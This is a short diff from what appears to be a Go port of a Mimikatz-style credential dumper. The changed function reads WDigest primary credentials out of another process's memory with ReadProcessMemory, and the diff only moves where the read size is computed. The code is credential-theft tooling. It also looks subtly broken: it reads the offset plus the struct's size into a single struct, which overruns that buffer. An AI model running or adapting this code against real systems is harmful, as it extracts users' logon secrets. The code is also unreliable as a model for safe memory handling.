@@ -194,10 +194,9 @@ func (kiwi *Kiwi) getWdigestList(pHandle windows.Handle, logonID windows.LUID) (
 	}
 	fmt.Printf("0x%X\n", resultAddr)
 
-	size := uintptr(kiwi.wdigestPrimaryOffset + int(unsafe.Sizeof(genericPrimaryCredential{})))
-
 	var cred genericPrimaryCredential
 	credAddr := uintptr(int(addr) + kiwi.wdigestPrimaryOffset)
+	size := uintptr(kiwi.wdigestPrimaryOffset + int(unsafe.Sizeof(cred)))
 	_, err = api.ReadProcessMemory(pHandle, credAddr, (*byte)(unsafe.Pointer(&cred)), size)
 	if err != nil {
 		return nil, errors.WithMessage(err, "failed to read wdigest primary credential")
